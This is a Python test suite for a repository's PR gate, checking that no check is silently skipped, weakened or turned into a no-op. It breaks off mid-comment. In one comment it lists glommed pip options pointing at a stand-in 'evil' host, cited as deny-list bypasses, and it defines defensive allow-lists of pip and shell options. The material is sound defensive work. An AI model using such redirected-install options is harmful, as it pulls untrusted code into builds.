#!/usr/bin/env python3
"""Offline tests for scripts/ai/pr_gate.py — the PR gate's check selector and reporter.

The gate exists because a skipped check reads like a passing one, so these tests care most
about the ways it could go quiet: a suite no check runs, a missing dependency reported as a
skip, an advisory check silently promoted or demoted, a trigger list that selects nothing.

Run offline: python tests/test_pr_gate.py
"""

import ast
import hashlib
import importlib.util
import io
import os
import pathlib
import re
import subprocess
import sys
import tempfile
from contextlib import contextmanager, redirect_stdout

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(REPO, "scripts", "ai"))

import pr_gate  # noqa: E402
import check_plan_readme_consistency  # noqa: E402

PASSED = 0
FAILED = []
# The shell vocabulary, module-scoped because it had five copies with three different contents, and
# the copies disagreed: `[[ … ]]` and `while true` were accepted by some rules and refused by others,
# so two correct respellings failed. Anything comparing shell words uses these (the function-scoped
# TEST_CMDS / NO_OPS / OPENERS alias them for the rules defined further down).
SHELL_TEST_CMDS = ("[", "[[", "test")
# Read by the tail whitelist, which is defined above their old homes. Module scope for
# the same reason as the vocabulary above: one definition, not one per reader.
# The complete set of options that may follow a pinned pip install, and their arity. A *whitelist*,
# after two rounds of trying to enumerate the dangerous ones instead:
#
#   round 16 refused a deny-list of payload options by name, split on `=`, which closed
#   `--index-url=URL` and left `-ihttps://evil/simple`, `-rNOPE.txt` and `-fhttps://evil` — the
#   glommed short forms pip parses identically — along with `--no-index`, `--proxy=`,
#   `--trusted-host=`, `--user`, `--force-reinstall`, `--dry-run` and `--no-build-isolation`, none of
#   which anyone had thought to name.
#
# Enumerating what may not happen requires knowing every option pip has, now and in later versions.
# Enumerating what may happen requires knowing what this workflow does, which is one install of one
# pinned requirement list. `False` means the option takes no value, `True` means it takes one word.
# The options a pinned pip install may carry, mapped to whether each takes a separate value.
# Deliberately excludes every option that names a place to fetch code from (`-r`, `-e`, `--index-url`,
# `--extra-index-url`, `--find-links`, `--target`, `--config-settings`): those turn a pinned install
# into an arbitrary one, so their value would not be a value but a payload, and they stay refused
# along with bare package names. A whitelist because the deny-list version closed `--index-url=URL`
# and left `-iURL`, the glommed short form of the same option, open.
PIP_OPTS = {"--quiet": False, "-q": False, "--verbose": False, "-v": False,
            "--no-color": False, "--no-input": False, "--disable-pip-version-check": False,
            "--upgrade": False, "-U": False, "--no-cache-dir": False,
            "--upgrade-strategy": True, "--timeout": True, "--retries": True,
            "--progress-bar": True}
# The `set` flags a step may open with. `e` and `u` are required by `set_flags_ok`; the rest are what
# a maintainer plausibly adds and none of them changes whether a command runs or whether its failure
# is fatal. A whitelist because the blacklist version — refusing only `n` — admitted `set -teuo
# pipefail`, and `-t` makes bash run one command and exit.
SET_FLAGS = frozenset("euxEv")
# The same options under the names `set -o` takes, so one whitelist reads both spellings. Without
# this, `-o` values were collected and never checked: `set -euo pipefail -o noexec` kept every
# required letter and turned on `-n`, the option the letter whitelist above exists to refuse.
# `pipefail` is deliberately absent — it has no single-letter form and is required separately.
SET_LONG = {"errexit": "e", "nounset": "u", "xtrace": "x", "errtrace": "E", "verbose": "v"}
TERMINATOR = ("exit", "return")
KEYWORDS = ("then", "else", "elif", "do", "done", "fi", "esac", "!", "{", "}", "(", ")")
SHELL_NO_OPS = (":", "true", "false")
SHELL_OPENERS = ("if", "elif", "while", "until", "for", "case")
# EXPECTED is a bare literal on purpose. Deriving it from the workflow's shape self-cancelled: a
# silenced loop decremented the expectation by exactly what it stopped checking, so the invariant
# read PASSED == EXPECTED with checks missing. A literal has to be raised by hand, which is the point.


@contextmanager
def outside_any_repo(path):
    """Make `path` genuinely repo-less however TMPDIR is pointed.

    Two checks below assert that an unusable repo is a *tool error*, and both expressed "unusable" as
    "a fresh temp directory" — which is only true while TMPDIR sits outside a git repository. Point it
    inside one (a reviewer did, working around a sandbox restriction on /tmp) and git discovers the
    enclosing repo instead, so both checks fail while the property they test still holds. A test whose
    subject is "no repo here" has to construct that, not inherit it from the environment.
    """
    # GIT_CEILING_DIRECTORIES was the first attempt and does not do this: pointed at the starting
    # directory it still discovered the enclosing repo. GIT_DIR naming a path that does not exist
    # fails discovery outright, which is the property both checks are actually about.
    prior = os.environ.get("GIT_DIR")
    os.environ["GIT_DIR"] = os.path.join(os.path.realpath(path), "absent-on-purpose")
    try:
        yield
    finally:
        if prior is None:
            os.environ.pop("GIT_DIR", None)
        else:
            os.environ["GIT_DIR"] = prior


def check_named(name):
    """The CHECKS entry called `name`, or None — never a StopIteration.

    Spelled as a bare `next()` in five places, renaming a check aborted the whole suite with
    `StopIteration:` and no message: no [FAIL], no diagnostic, no count. A missing check is a
    finding to report, not an exception to raise.
    """
    return next((c for c in pr_gate.CHECKS if c["name"] == name), None)


def check(label, condition, detail=""):
    global PASSED
    if condition:
        PASSED += 1
        print(f"  [PASS] {label}")
    else:
        FAILED.append(label)
        print(f"  [FAIL] {label}" + (f"\n         {detail}" if detail else ""))


def upgrade_flag(word):
    """Does this word carry pip's upgrade flag, bundled or not?

    Two readers ask this — `pip_install_ok`, deciding whether a `pip install pip` is the pinned
    self-upgrade, and `self_upgrade`, deciding whether an install is exempt from the restated-dependency
    rule. Both spelled it `word in ("--upgrade", "-U")`, which does not see the `U` in `-qU`. Teaching
    the first about bundles and not the second produced exactly the half-fix this file keeps recording:
    the bundle was accepted as a set of flags and then the command carrying it was refused, by the
    second reader, with a message about a restated dependency. One function now, so the next bundle
    spelling is right in both places or wrong in both.
    """
    return word == "--upgrade" or bool(re.fullmatch(r"-[A-Za-z]+", word) and "U" in word[1:])


def body_of(src, marker, label):
    """The source between `marker` and the next top-level `def`, or "" with a reported failure.

    Three rules scope themselves to one function by splitting on its `def` line and taking `[1]`. That
    index is a crash whenever the function is renamed — a legitimate refactor, since nothing pins those
    names — and a crash here is worse than a failure: the suite's own count is an invariant ("N checks
    ran and N were expected"), so an exception partway through discards every remaining assertion *and*
    the invariant that would have reported their absence. A consistent rename of
    `run_cci_reference_drift` aborted the run at 456 of 503 with no `[FAIL]` printed at all. Two earlier
    rounds each shipped one of these; collecting the pattern in one place is the only way the next
    caller inherits the guard instead of repeating the bug.
    """
    parts = src.split(marker)
    check(f"{label} is still named {marker!r}, so the rules scoped to it still apply",
          len(parts) > 1, f"not found — rename the marker in this file too")
    return parts[1].split("\ndef ")[0] if len(parts) > 1 else ""


def run_gate(*args):
    proc = subprocess.run([sys.executable, os.path.join(REPO, "scripts", "ai", "pr_gate.py"),
                           *args], cwd=REPO, capture_output=True, text=True)
    return proc.returncode, proc.stdout + proc.stderr


def selected_names(files):
    return {c["name"] for c in pr_gate.CHECKS if pr_gate.selects(c, files)}


def main_with(args):
    """Drive main() in-process so the verdict itself is asserted, not just its helpers.

    Testing `missing_deps()` and `unlisted_suites()` in isolation left both able to report a
    problem while the gate still exited 0 — the absence hole this gate exists to prevent, in
    the gate's own tests. These go through the exit code.
    """
    # pr_gate_suite triggers on tests/, so a fixture naming a tests/ path would select this
    # very suite and main() would run it as a subprocess of itself. Refused here, once, rather
    # than trusted to every future call site: an unbounded recursion in a test that runs the
    # real gate is a hang, not a failure.
    if "--changed-files-from" in args:
        listed = args[args.index("--changed-files-from") + 1]
        with open(listed) as fh:
            fixture_paths = [ln.strip() for ln in fh if ln.strip()]
        nesting = [c["name"] for c in pr_gate.CHECKS
                   if pr_gate.selects(c, fixture_paths) and c["cmd"]
                   and "tests/test_pr_gate.py" in c["cmd"]]
        assert not nesting, f"fixture {fixture_paths} would nest the gate inside {nesting}"
    saved = sys.argv
    buf = io.StringIO()
    try:
        sys.argv = ["pr_gate.py", *args]
        with redirect_stdout(buf):
            try:
                code = pr_gate.main()
            except SystemExit as exc:
                # `die()` exits rather than returning, so a tool error arrives as SystemExit.
                # Letting it escape would abort this suite mid-run and look like a crash
                # instead of the exit code under test.
                code = exc.code if isinstance(exc.code, int) else 2
    finally:
        sys.argv = saved
    return code, buf.getvalue()


def changed_list(*paths):
    fh = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    fh.write("".join(p + "\n" for p in paths))
    fh.close()
    return fh.name


# First, because ~25 later assertions subscript these keys directly and the count invariant is the
# last thing to print. A check dict missing `gating`, `deps`, `triggers` or `name` raised a KeyError
# ~100 lines *before* the rule written to report a missing trigger — fourth time in five rounds that a
# crash discarded the count invariant along with several hundred assertions, and reporting a defect and
# then tripping over the same data is strictly worse than either alone.
#
# So the shape is reported here and then *backfilled*, rather than left to crash a consumer: the
# reader gets one finding naming the check and the key, and every assertion after it still runs. The
# defaults are the inert choice in each case — no triggers (selects nothing), no deps, gating (the
# safe side), and a name that cannot collide.
print("\nEvery check declares the keys the suite reads")
REQUIRED_KEYS = ("name", "cmd", "triggers", "deps", "gating")


def missing_keys(checks):
    return sorted((c.get("name", "<unnamed>"), k) for c in checks
                  for k in REQUIRED_KEYS if k not in c)


check("every check declares name, cmd, triggers, deps and gating — the keys read by subscript "
      "below, so a missing one crashes a consumer rather than reporting here (REQUIRED_KEYS)",
      not missing_keys(pr_gate.CHECKS), missing_keys(pr_gate.CHECKS))
check("that rule can actually see a missing key, rather than passing because every check happens "
      "to be well formed today",
      missing_keys([{"name": "x", "cmd": None, "triggers": ["a/"], "deps": ()}])
      == [("x", "gating")])
for _i, _c in enumerate(pr_gate.CHECKS):
    _c.setdefault("name", f"<unnamed-{_i}>")
    _c.setdefault("cmd", None)
    _c.setdefault("triggers", [])
    _c.setdefault("deps", ())
    _c.setdefault("gating", True)

print("\nSelection maps a change to the checks that cover it")
sel = selected_names(["datasets/sfdmu/qb-pricing/export.json"])
check("a data plan change selects the plan README gate",
      "plan_readme_consistency" in sel, sel)
check("a data plan change selects the SFDMU validator", "sfdmu_datasets" in sel, sel)
sel = selected_names(["docs/guides/some-guide.md"])
check("a docs change selects the build-step citation check",
      "doc_build_steps" in sel, sel)
check("a docs change does not select the data plan gate",
      "plan_readme_consistency" not in sel, sel)
sel = selected_names(["cumulusci.yml"])
check("a cumulusci.yml change selects the CCI reference drift check",
      "cci_reference_drift" in sel, sel)
sel = selected_names(["docs/erds/erd-data.json"])
check("an ERD data change selects the ERD count check", "erd_doc_counts" in sel, sel)
# Selection must still be able to come up empty, or "selected" means nothing. The probe has
# to be outside the manifest audit's roots, which are deliberately repo-wide: a manifest can
# cite a path anywhere, so robot/ (a root) no longer qualifies as an unclaimed path.
sel = selected_names(["docker/Dockerfile"])
check("a path no check claims selects nothing rather than everything", sel == set(), sel)
# A suffix selector, for the check that walks every .md in the repo. Prefix triggers left
# the root README and seven datasets/**/README.md build-step citations unable to select the
# suite that audits them.
check("the root README selects the build-step check",
      "doc_build_steps" in selected_names(["README.md"]),
      selected_names(["README.md"]))
check("a data plan README selects the build-step check",
      "doc_build_steps" in selected_names(
          ["datasets/sfdmu/qb/en-US/qb-billing/README.md"]))
check("a non-markdown file does not select it via the suffix",
      "doc_build_steps" not in selected_names(["robot/x.robot"]))
check("only the whole-repo check carries a suffix selector",
      [c["name"] for c in pr_gate.CHECKS if c.get("suffixes")] == ["doc_build_steps"],
      [c["name"] for c in pr_gate.CHECKS if c.get("suffixes")])
check("a harness change selects the harness suites",
      "harness_suites" in selected_names(["scripts/txn_data_harness/cli.py"]))
check("an empty change set selects nothing", selected_names([]) == set())
# Triggers are path prefixes, not substrings: a vendored or nested lookalike must not
# select a check that has no authority over it.
check("a trigger embedded mid-path does not select",
      "plan_readme_consistency" not in selected_names(
          ["vendor/datasets/sfdmu/export.json"]),
      selected_names(["vendor/datasets/sfdmu/export.json"]))
check("a trigger at the start does select",
      "plan_readme_consistency" in selected_names(["datasets/sfdmu/export.json"]))

print("\nEvery check is well formed")
names = [c["name"] for c in pr_gate.CHECKS]
check("check names are unique", len(names) == len(set(names)), names)
check("every check has at least one trigger",
      all(c["triggers"] for c in pr_gate.CHECKS))
check("every declared dep is one the gate knows how to detect",
      all(d in pr_gate.DEPS for c in pr_gate.CHECKS for d in c["deps"]))
check("every non-gating check explains itself",
      all(c.get("note") for c in pr_gate.CHECKS if not c["gating"]))
tooling_spec = check_named("agent_tooling")
check("agent_tooling declares the 3.10+ floor it actually needs",
      tooling_spec is not None and tooling_spec.get("min_python") == (3, 10))

print("\nNo suite goes unrun, and none is claimed but absent")
check("no suite in tests/ is left unclaimed", pr_gate.unlisted_suites() == [],
      pr_gate.unlisted_suites())
missing = [s for s in pr_gate.STDLIB_SUITES if not os.path.exists(os.path.join(REPO, s))]
check("every stdlib suite the gate names exists on disk", missing == [], missing)
missing = [s for s in pr_gate.CLAIMED_SUITES if not os.path.exists(os.path.join(REPO, s))]
check("every claimed suite or directory exists on disk", missing == [], missing)
missing = [s for s in pr_gate.EXCLUDED_SUITES if not os.path.exists(os.path.join(REPO, s))]
check("every excluded suite exists on disk", missing == [], missing)
check("every exclusion states a reason",
      all(r.strip() for r in pr_gate.EXCLUDED_SUITES.values()))
# An exclusion is a decision not to gate a suite, and its reason is prose nothing can check. So the
# *set* is pinned here instead: moving a suite out of the gate now edits this line too, which is the
# only mechanism that puts the decision in front of a reviewer. Laundering one from STDLIB_SUITES
# into EXCLUDED_SUITES with a plausible-sounding reason was otherwise a green, silent edit.
check("the set of suites held outside the gate is the reviewed one",
      set(pr_gate.EXCLUDED_SUITES) == {"tests/test-cleanup.sh", "tests/test-prepare-rlm-org.sh"},
      "edit EXCLUDED_SUITES here and in pr_gate.py together: "
      f"{sorted(pr_gate.EXCLUDED_SUITES)}")
check("no suite is both claimed and excluded",
      not (set(pr_gate.EXCLUDED_SUITES) & pr_gate.CLAIMED_SUITES))
check("a suite is never run twice — no dedicated check's suite is also in a bulk list",
      "tests/test_branch_scope.py" not in pr_gate.STDLIB_SUITES
      and "tests/test_erd_doc_counts.py" not in pr_gate.STDLIB_SUITES)

# Whatever a check's argv is, it has to be an argv that *runs* the suites it names. `--collect-only`
# is the sharpest example: pytest walks the files, reports what it found and exits 0 without running
# a test, so the check stays listed, stays selected, stays green, and asserts nothing. Confirmed
# against a deliberately failing test — `-q` exits 1, `-q --collect-only` exits 0. Enumerating the
# options that suppress execution means knowing pytest's whole surface (`--co`, `-k`, `--ignore=`,
# `--deselect`, `--maxfail=0`, `-x` with a skip…), so the allowed argv words are enumerated instead:
# an interpreter, `-m pytest`, `-q`, and paths. Anything else is a deliberate edit here.
# `check` and `--check` are the read-only subcommands of two gate scripts (analyze_agent_tooling.py,
# skill_manifest.py), not pytest options.
# `--strict` is check_plan_readme_consistency.py's own flag — it fails WARN-level findings too,
# not just ERROR-level, closing the gap where an operation/externalId mismatch or missing-object
# row would otherwise gate silently (pack 147 / PR #406 review). Admitted per-check via
# PER_CHECK_EXTRA_WORDS below, not folded into CMD_WORDS — CMD_WORDS is checked against EVERY
# check's cmd, so a global admission would let a future, unrelated check's argv carry the literal
# word "--strict" without tripping this whitelist at all.
# `-c` and `pass` were in here, and they are how a check becomes a no-op that always exits 0:
# `cmd=["python", "-c", "pass"]` is built entirely from whitelisted words, so rewriting any check's
# argv to it passed. Nothing in `CHECKS` needs them — the only argvs that use `-c pass` are this
# suite's own synthetic probes, and they are appended to `CHECKS` *below* the assertion, so the
# whitelist never had to admit them. A whitelist widened for a caller that does not exist is a
# whitelist widened for the attacker only.
CMD_WORDS = {"python", "-m", "pytest", "-q", "check", "--check"}
# Words admitted only for the one check that declares them, not for CHECKS at large — the
# scoping the global CMD_WORDS set cannot express.
PER_CHECK_EXTRA_WORDS = {"plan_readme_consistency": {"--strict"}}
bad_words = sorted({w for c in pr_gate.CHECKS for w in (c["cmd"] or ())
                    if w not in CMD_WORDS
                    and w not in PER_CHECK_EXTRA_WORDS.get(c["name"], set())
                    and not w.startswith(("tests/", "scripts/"))})
check("no check's argv carries a word outside CMD_WORDS — nothing that could collect without "
      "running, or install, or redirect", bad_words == [], bad_words)
# PER_CHECK_EXTRA_WORDS only proves the whitelist tolerates the word in this check's own argv —
# it says nothing about whether check_plan_readme_consistency.py itself still defines --strict.
# A future edit dropping the flag from that script's argparse would still pass every check above
# (the word is still merely *listed* here) and only surface as a live argparse error the next time
# pr_gate.py actually ran it — not as a signal from this suite. Parse an actual "--strict" argv
# against the script's real parser instead of substring-matching --help text: --help output also
# contains the literal string "--strict" in the script's own docstring/Usage block regardless of
# whether the flag is declared, which live-reproduced as a no-op (round 13 of PR #406's review,
# pack 147) — removing the add_argument call still left "--strict" in --help with exit 0.
try:
    # argparse's own error path for an unrecognized flag is exit(2), i.e. SystemExit — a future
    # removal of --strict must not crash this suite mid-run; it must fail cleanly as one check().
    strict_ok = check_plan_readme_consistency.build_arg_parser().parse_args(["--strict"]).strict is True
except SystemExit:
    strict_ok = False
check("check_plan_readme_consistency.py's argparse still defines --strict — the flag "
      "PER_CHECK_EXTRA_WORDS admits for it above",
      strict_ok, strict_ok)
# The rule above is only worth its line if the whitelist actually refuses the no-op. A probe that
# rewrote a check's argv to `python -c pass` *was* killed while `-c` and `pass` were still whitelisted
# — by the orphan-suite rule, which noticed the suite that argv stopped naming, not by this rule at
# all. So the whitelist could have gone on admitting a check that always exits 0, and the sweep would
# have kept reporting a kill. Named here so the refusal is asserted rather than inferred.
check("and the whitelist refuses the no-op argv specifically, independent of the orphan-suite rule "
      "that happened to catch it",
      not {"-c", "pass"} & CMD_WORDS, sorted(CMD_WORDS))
# `python3` was the same argument stopping one word short. No check needs it — every entry in CHECKS
# begins `python` — and `run()` substituted `sys.executable` for that spelling only, so a check spelled
# `python3` ran under a different interpreter from the one its `deps` and `min_python` were verified
# against. Both halves are closed: the word is gone from here, and `run()` now remaps either spelling.
check("and refuses an interpreter the gate does not normalise, which would run a check against "
      "dependencies verified for a different one", "python3" not in CMD_WORDS, sorted(CMD_WORDS))
check("while the gate itself remaps both spellings, so re-adding the word cannot reintroduce the gap",
      re.search(r'argv\[0\] in \("python", "python3"\)',
                pathlib.Path(pr_gate.__file__).read_text()) is not None)

# A check must run when the suite it runs is edited. The trigger-coverage rule further down asks
# whether a check's triggers cover the files its suites *read*; this asks the more basic question it
# skipped, about the suite file itself. Deleting `"tests/"` from a bulk check's triggers passed both
# — the suites read scripts/ and docs/, so coverage was satisfied, and editing thirteen suites then
# selected nothing that ran them.
def suites_of(check_spec):
    """The suite paths a check runs, including the lists resolve() splices in.

    Read off `SPLICED_SUITES`, not matched against the two names. Round 19 made that map the single
    mapping *inside* `pr_gate.py` and left this reader — and `check_sources` below — spelling the
    pairing as name literals, so the derivation stopped at the file boundary. Nothing pins those names,
    so a plain consistent rename of `requests_offline_suites` made both fall through to the `cmd` scan,
    which returns `[]` for a bulk check (its `cmd` is `None`). Dropping that check's suite triggers then
    went from correctly failing to 503/503 with two suites silent — the same accounting lie
    `_claimed_suites()` was rewritten to delete, reappearing one file over.
    """
    spliced = pr_gate.SPLICED_SUITES.get(check_spec["name"])
    if spliced is not None:
        return list(spliced)
    return [a for a in (check_spec["cmd"] or ()) if a.startswith("tests/")]


def selects(trigger, suite):
    # pytest takes a directory without its separator (`tests/build_harness`) while triggers carry one
    # (`tests/build_harness/`), and comparing the two spellings raw accused a correctly configured
    # check — a rule firing on correct code, which is how rules get deleted.
    return suite.startswith(trigger) or trigger.rstrip("/") == suite.rstrip("/")


unselected = sorted({f"{c['name']} does not run on {s}"
                     for c in pr_gate.CHECKS for s in suites_of(c)
                     if not any(selects(t, s) for t in c["triggers"])})
check("editing a suite selects the check that runs it", unselected == [], unselected)


def first_party_imports(suite):
    """The repo's own modules a suite imports, as repo-relative paths.

    The third question in this family, and the one nothing asked. The rule above covers the suite
    *file*; the trigger-coverage rule covers the paths a suite *opens*. Neither reads its `import`
    statements, so `tests/test_expression_set_schema.py` could import `tasks/expression_set_schema.py`
    while no check triggering on that module ran the tests for it — a change to the code was covered by
    a selection that excluded the suite exercising it. Editing the module selected `skill_manifest`,
    `stdlib_offline_suites` and `yaml_offline_suites`, none of which runs it.

    Read from the AST rather than by regex, so a commented-out or string-mentioned import is not
    counted and an aliased one still is.
    """
    try:
        tree = ast.parse(pathlib.Path(os.path.join(REPO, suite)).read_text())
    except (OSError, SyntaxError):
        return set()
    named = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module and not node.level:
            named.add(node.module)
        elif isinstance(node, ast.Import):
            named |= {a.name for a in node.names}
    return {m.replace(".", "/") + ".py" for m in named
            if os.path.exists(os.path.join(REPO, m.replace(".", "/") + ".py"))}


uncovered = sorted({f"{c['name']} runs {s}, which imports {m}, but triggers on neither"
                    for c in pr_gate.CHECKS for s in suites_of(c)
                    for m in first_party_imports(s)
                    if not any(selects(t, m) for t in c["triggers"])})
check("a check triggers on the modules its own suites import, so a change to the code cannot select "
      "a set of checks that excludes the suite testing it",
      uncovered == [], uncovered)
check("that rule can see an uncovered import, rather than passing because the trigger lists happen "
      "to be complete today",
      first_party_imports("tests/test_expression_set_schema.py")
      >= {"tasks/expression_set_schema.py"})
# Discovery must recurse. A flat listing missed 30 suites in tests/build_harness/ and
# tests/txn_data_harness/ while reporting "none unclaimed".
nested = [s for s in pr_gate.CLAIMED_SUITES if s.endswith("/")]
check("nested suite directories are claimed as directories", len(nested) >= 2, nested)
real_nested = [
    f for d in nested
    for f in os.listdir(os.path.join(REPO, d))
    if f.startswith("test_") and f.endswith(".py")
]
check("those directories really do hold suites", len(real_nested) > 20, len(real_nested))

# A new suite must fail loudly rather than join silently — verified in a temp tree, so a
# crash cannot leave a stray file in the real tests/ that then fails everyone else's gate.
with tempfile.TemporaryDirectory() as fake_repo:
    os.makedirs(os.path.join(fake_repo, "tests", "nested"))
    open(os.path.join(fake_repo, "tests", "nested", "test_probe.py"), "w").close()
    saved_root = pr_gate.REPO_ROOT
    try:
        pr_gate.REPO_ROOT = fake_repo
        found = pr_gate.unlisted_suites()
        check("an unclaimed suite in a nested directory is detected",
              found == ["tests/nested/test_probe.py"], found)
        code, out = main_with(["--changed-files-from", os.devnull])
        check("an unclaimed suite fails the gate", code == 1, code)
        check("the unclaimed suite is named in the output", "suites no check runs" in out)
        # A shell suite must be discovered too, so excluding one is a declaration.
        open(os.path.join(fake_repo, "tests", "test-probe.sh"), "w").close()
        check("a shell suite is discovered rather than missed by the .py filter",
              "tests/test-probe.sh" in pr_gate.unlisted_suites(),
              pr_gate.unlisted_suites())
        # A directory claim covers pytest-collectable .py only. A shell suite dropped into a
        # claimed directory has no runner, so being "claimed" there would be a silent skip.
        # `[0]` on this list, and the whole suite aborted on an IndexError. The list was a literal
        # set until the claim became derived; now the trailing slash is produced by `os.path.isdir`,
        # so if the harness directories move while a `cmd` still names the old paths, there is no
        # directory entry to index. Four rules above had already reported that correctly — and then
        # the traceback threw away the remaining ~445, including the `REACHED < EXPECTED` invariant
        # whose one job is announcing that a rule stopped running. Iterating a 1-slice keeps the
        # diagnosis with the rules that make it.
        for claimed_dir in sorted(c for c in pr_gate.CLAIMED_SUITES if c.endswith("/"))[:1]:
            os.makedirs(os.path.join(fake_repo, claimed_dir), exist_ok=True)
            open(os.path.join(fake_repo, claimed_dir, "test_inside.py"), "w").close()
            open(os.path.join(fake_repo, claimed_dir, "test-inside.sh"), "w").close()
            listed = pr_gate.unlisted_suites()
            check("a .py suite under a claimed directory is covered by the claim",
                  claimed_dir + "test_inside.py" not in listed, listed)
            check("a shell suite under a claimed directory is not covered by the claim",
                  claimed_dir + "test-inside.sh" in listed, listed)
    finally:
        pr_gate.REPO_ROOT = saved_root

with tempfile.TemporaryDirectory() as empty:
    saved_root = pr_gate.REPO_ROOT
    try:
        pr_gate.REPO_ROOT = empty
        check("a missing tests/ directory is reported, not read as 'none unclaimed'",
              pr_gate.unlisted_suites() != [], pr_gate.unlisted_suites())
    finally:
        pr_gate.REPO_ROOT = saved_root

print("\nA missing dependency fails a gating check instead of skipping it")
fake_gating = dict(name="probe", cmd=["python", "-c", "pass"], triggers=["x"],
                   deps=["cumulusci"], gating=True)
saved = dict(pr_gate.DEPS)
try:
    pr_gate.DEPS["cumulusci"] = "a_module_that_does_not_exist_anywhere"
    check("a gating check with an absent dep reports it as missing",
          pr_gate.missing_deps(fake_gating) == ["cumulusci"],
          pr_gate.missing_deps(fake_gating))
finally:
    pr_gate.DEPS.clear()
    pr_gate.DEPS.update(saved)
check("a satisfied dep reports nothing missing",
      pr_gate.missing_deps(dict(fake_gating, deps=[])) == [])
check("a future python floor is reported as a missing dep",
      pr_gate.missing_deps(dict(fake_gating, deps=[], min_python=(99, 0))) != [])

# ...and the verdict, not just the report: an absent dependency has to fail the gate.
saved = dict(pr_gate.DEPS)
listing = changed_list("docs/guides/some-guide.md")
try:
    pr_gate.DEPS["cumulusci"] = "a_module_that_does_not_exist_anywhere"
    code, out = main_with(["--changed-files-from", listing])
    check("an absent dependency fails the gate rather than skipping it", code == 1, code)
    check("the absent dependency is named as MISSING-DEP", "MISSING-DEP" in out)
finally:
    pr_gate.DEPS.clear()
    pr_gate.DEPS.update(saved)
    os.unlink(listing)

print("\nA check that actually fails fails the gate")
# The gate's whole purpose. Without this, reclassifying every runtime failure as advisory
# would leave the suite green — the one mutation that survived the first round.
listing = changed_list("zz_probe_path/thing.txt")
pr_gate.CHECKS.append(dict(name="zz_probe_failing",
                           cmd=["python", "-c", "import sys; sys.exit(1)"],
                           triggers=["zz_probe_path/"], deps=[], gating=True))
try:
    code, out = main_with(["--changed-files-from", listing])
    check("a failing gating check exits 1", code == 1, code)
    check("a failing gating check is labelled FAIL", "[FAIL" in out)
    check("the failing check is named in the summary", "zz_probe_failing" in out)
    check("its output is echoed for diagnosis", "zz_probe_failing (FAIL)" in out)
    check("a failure with no output says so rather than showing an empty section",
          "the check produced no output" in out)
    pr_gate.CHECKS[-1]["gating"] = False
    pr_gate.CHECKS[-1]["note"] = "probe"
    code, out = main_with(["--changed-files-from", listing])
    check("the same failure as advisory does not fail the gate", code == 0, code)
    check("but is still reported as an advisory failure", "advisory failure" in out)
    # Advisory output is truncated to its head; a gating failure's is not, so it stays
    # diagnosable from the log alone.
    noisy = ["python", "-c",
             f"print('\\n'.join(str(i) for i in range({pr_gate.ADVISORY_HEAD + 30})))"
             "; import sys; sys.exit(1)"]
    pr_gate.CHECKS[-1]["cmd"] = noisy
    code, out = main_with(["--changed-files-from", listing])
    check("a long advisory report is truncated rather than dumped whole",
          "line(s) elided" in out, out[-300:])
    # The head, not the tail: the SFDMU validator's Critical counts are at the top, and
    # tailing kept twenty lines of passing plans and elided the only useful part.
    check("truncation keeps the beginning of an advisory report", "\n0\n" in out)
    check("...and drops the end",
          f"\n{pr_gate.ADVISORY_HEAD + 29}\n" not in out)
    pr_gate.CHECKS[-1]["gating"] = True
    code, out = main_with(["--changed-files-from", listing])
    check("a gating failure is never truncated", "line(s) elided" not in out)
    check("...and shows its earliest output too", "\n0\n" in out)
finally:
    pr_gate.CHECKS.pop()
    os.unlink(listing)

print("\nA hung check is bounded and reported, not left to burn the job's budget")
listing = changed_list("zz_probe_path/thing.txt")
saved_timeout = pr_gate.CHECK_TIMEOUT
pr_gate.CHECKS.append(dict(name="zz_probe_hang",
                           cmd=["python", "-c", "import time; time.sleep(30)"],
                           triggers=["zz_probe_path/"], deps=[], gating=True))
try:
    pr_gate.CHECK_TIMEOUT = 1
    code, out = main_with(["--changed-files-from", listing])
    check("a check exceeding the timeout fails the gate", code == 1, code)
    check("the timeout is named in the output", "timed out after 1s" in out, out[-300:])
finally:
    pr_gate.CHECK_TIMEOUT = saved_timeout
    pr_gate.CHECKS.pop()
    os.unlink(listing)

print("\nNo check is currently advisory")
advisory = [c for c in pr_gate.CHECKS if not c["gating"]]
check("zero checks are advisory", len(advisory) == 0, [c["name"] for c in advisory])
# sfdmu_datasets was the one exception until pack 110 removed the unwired mfg-multicurrency plan
# that carried its last High findings (pack 123 had already fixed its two false-positive
# Criticals). With both landed the check gates like every other one; this guards the flip staying
# put rather than a future edit quietly reintroducing the note= field along with gating=False.
sfdmu_check = next(c for c in pr_gate.CHECKS if c["name"] == "sfdmu_datasets")
check("the SFDMU validator gates like every other check", sfdmu_check["gating"] is True)
check("it carries no leftover advisory note", "note" not in sfdmu_check, sfdmu_check.get("note"))

print("\nA failure in one command does not hide the commands after it")
code, out, _ = pr_gate.run_sequence([["python", "-c", "print('first')"],
                                     ["python", "-c", "import sys; sys.exit(3)"],
                                     ["python", "-c", "print('third')"]])
check("a sequence reports non-zero when any command fails", code != 0, code)
check("commands before the failure still ran", "first" in out)
check("commands after the failure still ran", "third" in out)

print("\nDependency pins agree with the workflow that installs them")
prepare = os.path.join(REPO, ".github", "workflows", "prepare-rlm-org.yml")
if os.path.exists(prepare):
    with open(prepare) as fh:
        body = fh.read()
    pinned = re.findall(r"cumulusci==([\d.]+)", body)
    gate_pin = re.findall(r"cumulusci==([\d.]+)", pr_gate.PINS.get("cumulusci", ""))
    check("the gate pins the same CumulusCI version prepare-rlm-org installs",
          bool(pinned) and bool(gate_pin) and pinned[0] == gate_pin[0],
          f"prepare-rlm-org={pinned}, pr_gate={gate_pin}")
else:
    check("prepare-rlm-org.yml exists to compare pins against", False, "file missing")

print("\nThe workflow that runs the gate cannot be quietly defanged")
# The gate is only as real as the job that invokes it, and every way of disabling that job
# leaves a green PR behind — which is the exact failure #264-58 exists to fix, one level up.
# So the workflow is asserted here rather than trusted to review. Both ways of not running are
# defects, in opposite directions: a `paths:` filter added in good faith leaves a required check
# Pending and blocks every PR that misses the paths, while an `if:` skip reports success.
workflow = os.path.join(REPO, ".github", "workflows", "pr-checks.yml")
if os.path.exists(workflow):
    with open(workflow) as fh:
        wf = fh.read()

    # Trailing comments, not just whole-line ones. The first version dropped only lines that
    # *start* with `#`, which left every substring rule below satisfiable by a comment on the same
    # line as the setting it contradicts: `fetch-depth: 1 # was fetch-depth: 0` passed the
    # full-history rule, and `pip install requests # reqs, pinned elsewhere` passed the
